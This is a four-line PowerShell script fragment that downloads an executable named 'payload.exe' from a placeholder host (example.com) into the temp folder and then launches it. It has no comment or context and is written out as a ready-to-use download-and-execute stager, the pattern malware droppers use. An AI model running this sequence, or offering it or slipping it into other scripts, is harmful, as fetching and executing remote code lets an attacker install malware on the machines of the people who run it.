$url = "http://example.com/payload.exe"
$output = "$env:temp\payload.exe"

Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output